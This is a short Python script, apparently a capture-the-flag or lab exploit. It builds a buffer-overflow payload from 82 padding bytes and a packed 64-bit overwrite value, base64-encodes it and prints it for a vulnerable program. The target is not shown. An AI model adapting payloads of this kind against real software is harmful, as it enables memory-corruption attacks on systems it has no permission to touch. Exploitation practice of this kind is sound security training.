
import sys
import struct
import base64

buf = b'qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq'
buf += struct.pack('<Q', 17066631561694339595)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
